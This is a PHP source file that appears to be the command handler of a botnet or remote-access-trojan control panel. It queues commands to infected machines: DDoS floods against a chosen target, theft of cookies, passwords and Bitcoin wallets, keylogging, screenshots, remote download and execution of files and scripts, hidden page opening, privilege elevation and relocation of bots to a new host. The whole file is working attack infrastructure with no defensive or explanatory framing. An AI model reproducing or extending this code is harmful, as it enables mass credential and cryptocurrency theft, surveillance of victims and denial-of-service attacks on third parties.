<?php
if ($_SESSION['csrf'] != $utils->sanitize($_POST['csrf'])) {
    $utils->show_alert("CSRF Token is invalid.", "danger", "times-circle");
    die();
}

$utils->show_input("csrf", $utils->sanitize($_POST['csrf']));

$client = new Clients;
if (isset($_POST['client'])) {
    $clientHWD = isset($_POST['client']) ? json_encode($_POST['client']) : null;
} elseif (isset($_POST['clients'])) {
    $clientHWD = $_POST['clients'];
} else {
    $utils->show_alert("You did not select a client to execute this command Please go back and choose a client.", "danger", "times-circle");
    die();
}

$command = isset($_POST['command']) ? $utils->sanitize($_POST['command']) : "nocommand";

$utils->show_input("command", $command);

$utils->show_input("clients", $clientHWD);

switch ($command) {
    case "nocommand":
        $utils->show_alert("You did not select a command to execute on the target deveice Please go back and choose a command.", "danger", "times-circle");
        break;

    case "uninstall":
        Send($clientHWD, "Uninstall");
        $utils->show_alert("Client Has Been Removed", "success", "check-circle");
        break;

    case "ddosw":
        if (isset($_POST['Form2'])) {
            if ($utils->sanitize($_POST['attacktype']) == "UDP Attack") {
                Send($clientHWD, "StartDDOS|BN|UDPAttack|BN|" . gethost($utils->sanitize($_POST['TargetURL'])) . "|BN|" . $_POST['thread'] . "|BN|" . $_POST['timeout']);
            }

            if ($utils->sanitize($_POST['attacktype']) == "TCP Attack") {
                Send($clientHWD, "StartDDOS|BN|TCPAttack|BN|" . gethost($utils->sanitize($_POST['TargetURL'])) . "|BN|" . $_POST['thread'] . "|BN|" . $_POST['timeout']);
            }

            if ($utils->sanitize($_POST['attacktype']) == "ARME Attack") {
                Send($clientHWD, "StartDDOS|BN|ARMEAttack|BN|" . gethost($utils->sanitize($_POST['TargetURL'])) . "|BN|" . $_POST['thread'] . "|BN|" . $_POST['timeout']);
            }

            if ($utils->sanitize($_POST['attacktype']) == "Slowloris Attack") {
                Send($clientHWD, "StartDDOS|BN|SlowlorisAttack|BN|" . gethost($utils->sanitize($_POST['TargetURL'])) . "|BN|" . $_POST['thread'] . "|BN|" . $_POST['timeout']);
            }

            if ($utils->sanitize($_POST['attacktype']) == "PostHTTP Attack") {
                Send($clientHWD, "StartDDOS|BN|PostHTTPAttack|BN|" . gethost($utils->sanitize($_POST['TargetURL'])) . "|BN|" . $_POST['thread'] . "|BN|" . $_POST['timeout']);
            }

            if ($utils->sanitize($_POST['attacktype']) == "HTTPGet Attack") {
                Send($clientHWD, "StartDDOS|BN|HTTPGetAttack|BN|" . gethost($utils->sanitize($_POST['TargetURL'])) . "|BN|" . $_POST['thread'] . "|BN|" . $_POST['timeout']);
            }

            if ($utils->sanitize($_POST['attacktype']) == "BandwidthFlood Attack") {
                Send($clientHWD, "StartDDOS|BN|BWFloodAttack|BN|" . gethost($utils->sanitize($_POST['TargetURL'])) . "|BN|" . $_POST['thread'] . "|BN|" . $_POST['timeout']);
            }

            $utils->show_alert("Command Has Been Send", "success", "check-circle");
        }
        menu("ddos_attack");
        break;

    case 'stopddos':
        if (isset($_POST['Form2'])) {
            if ($utils->sanitize($_POST['attacktype']) == "UDP Attack") {
                Send($clientHWD, "StopDDOS|BN|UDPAttack");
            }

            if ($utils->sanitize($_POST['attacktype']) == "TCP Attack") {
                Send($clientHWD, "StopDDOS|BN|TCPAttack");
            }

            if ($utils->sanitize($_POST['attacktype']) == "ARME Attack") {
                Send($clientHWD, "StopDDOS|BN|ARMEAttack");
            }

            if ($utils->sanitize($_POST['attacktype']) == "Slowloris Attack") {
                Send($clientHWD, "StopDDOS|BN|SlowlorisAttack");
            }

            if ($utils->sanitize($_POST['attacktype']) == "PostHTTP Attack") {
                Send($clientHWD, "StopDDOS|BN|PostHTTPAttack");
            }

            if ($utils->sanitize($_POST['attacktype']) == "HTTPGet Attack") {
                Send($clientHWD, "StopDDOS|BN|HTTPGetAttack");
            }

            if ($utils->sanitize($_POST['attacktype']) == "BandwidthFlood Attack") {
                Send($clientHWD, "StopDDOS|BN|BWFloodAttack");
            }
            $utils->show_alert("Command Has Been Send", "success", "check-circle");
        }
        menu("stop_ddos");
        break;

    case "uploadf":

        if (isset($_POST['Form2'])) {
            Send($clientHWD, "UploadFile|BN|" . $utils->sanitize($_POST['FileURL']) . "|BN|" . $utils->sanitize($_POST['Name']));
            $utils->show_alert("Command Has Been Send", "success", "check-circle");
        }
        menu("upload");
        break;

    case "update":

        if (isset($_POST['Form2'])) {
            Send($clientHWD, "UpdateClient|BN|" . $utils->sanitize($_POST['FileURL']));
            $utils->show_alert("Command Has Been Send", "success", "check-circle");
        }
        menu("update_client");
        break;

    case "ping":
        Send($clientHWD, "Ping");
        $utils->show_alert("Command Has Been Send", "success", "check-circle");
        break;

    case "msgbox":
        if (isset($_POST['Form2'])) {
            Send($clientHWD, "ShowMessageBox|BN|" . $utils->sanitize($_POST['Content']) . "|BN|" . $utils->sanitize($_POST['MessageTitle']) . "|BN|" . $utils->sanitize($_POST['msgicon']) . "|BN|" . $utils->sanitize($_POST['msgbutton']));
            $utils->show_alert("Command Has Been Send", "success", "check-circle");
        }
        menu("messagebox");
        break;

    case "openwp":
        if (isset($_POST['Form2'])) {
            Send($clientHWD, "OpenPage|BN|" . $utils->sanitize($_POST['Weburl']));
            $utils->show_alert("Command Has Been Send", "success", "check-circle");
        }
        menu("openpage");

        break;

    case "openhidden":
        if (isset($_POST['Form2'])) {
            Send($clientHWD, "OpenHidden|BN|" . $utils->sanitize($_POST['Weburl']));
            $utils->show_alert("Command Has Been Send", "success", "check-circle");
        }
        menu("openpage");
        break;

    case "close":
        $utils->show_alert("Command Has Been Send", "success", "check-circle");
        $client->updateStatus($clientHWD, "Offline");
        Send($clientHWD, 'Close');
        break;

    case "moveclient":
        if (isset($_POST['Form2'])) {
            Send($clientHWD, "MoveClient|BN|" . $utils->sanitize($_POST['newHost']));
            $utils->show_alert("Command Has Been Send", "success", "check-circle");
        }
        menu("move_bot");
        break;

    case "blacklist":
        $utils->show_alert("Client Has Been Blocked", "success", "check-circle");
        Send($clientHWD, 'Blacklist');
        break;

    case 'tkschot':
        $utils->show_alert("Command Has Been Send", "success", "check-circle");
        Send($clientHWD, 'Screenshot');
        break;

    case 'stealcookie':
        $utils->show_alert("Command Has Been Send", "success", "check-circle");
        Send($clientHWD, 'StealCookie');
        break;

    case 'stealchcookie':
        $utils->show_alert("Command Has Been Send", "success", "check-circle");
        Send($clientHWD, 'StealChCookies');
        break;

    case 'stealps':
        $utils->show_alert("Command Has Been Send", "success", "check-circle");
        Send($clientHWD, 'InstalledSoftwares');
        break;

    case 'startkl':
        $utils->show_alert("Command Has Been Send", "success", "check-circle");
        Send($clientHWD, 'StartKeylogger');
        break;

    case 'stopkl':
        $utils->show_alert("Command Has Been Send", "success", "check-circle");
        Send($clientHWD, 'StopKeylogger');
        break;

    case 'getlogs':
        $utils->show_alert("Command Has Been Send", "success", "check-circle");
        Send($clientHWD, 'RetriveLogs');
        break;

    case 'stealpassword':
        $utils->show_alert("Command Has Been Send", "success", "check-circle");
        Send($clientHWD, "StealPassword");
        break;

    case "stealbtc":
        $utils->show_alert("Command Has Been Send", "success", "check-circle");
        Send($clientHWD, "StealBitcoin");
        break;

    case "tempclean":
        $utils->show_alert("Command Has Been Send", "success", "check-circle");
        Send($clientHWD, "CleanTemp");
        break;

    case 'exec':
        if (isset($_POST['Form2'])) {
            $file_name = $utils->sanitize($_POST['file_name']);
            $data = $_POST['data'];
            $req = new POST;
            $req->prepare("scripts", $file_name, $data);
            if ($req->write() == true) {
                Send($clientHWD, "ExecuteScript|BN|" . $utils->sanitize($_POST['scriptType']) . "|BN|" . $utils->sanitize($_POST['file_name']));
                $utils->show_alert("Command Has Been Send", "success", "check-circle");
            }
        }
        menu("execute");
        break;

    case 'logoff':
        $utils->show_alert("Command Has Been Send", "success", "check-circle");
        Send($clientHWD, 'Logoff');
        break;

    case 'restart':
        $utils->show_alert("Command Has Been Send", "success", "check-circle");
        Send($clientHWD, 'Restart');
        break;

    case 'shutdown':
        $utils->show_alert("Command Has Been Send", "success", "check-circle");
        Send($clientHWD, 'Shutdown');
        break;

    case 'elev':
        $utils->show_alert("Command Has Been Send", "success", "check-circle");
        Send($clientHWD, 'Elevate');
        break;

    case 'restart':
        $utils->show_alert("Command Has Been Send", "success", "check-circle");
        Send($clientHWD, 'Restart');
        break;

    default:
        $utils->show_alert("Incorrect Command !!", "danger", "times-circle");
        break;
}

function Send($USER, $Command)
{
    try {
        $client = new Clients;
        $utils = new Utils;
        foreach (json_decode($USER) as $clientID) {
            $client->updateCommands($utils->sanitize($clientID), base64_encode($Command));
        }
    } catch (Exception $e) {
        die($e->getMessage());
    }
}

function menu($menu_name)
{
    $utils = new Utils;
    include_once "menus/" . $utils->sanitize($menu_name) . ".html";
}

function gethost($url)
{
    $input = trim($url, "/");
    if (!preg_match("#^http(s)?://#", $input)) {
        $input = "http://" . $input;
    }
    $urlParts = parse_url($input);
    $domain = preg_replace("/^www\./", '', $urlParts['host']);
    return gethostbyname($domain);
}
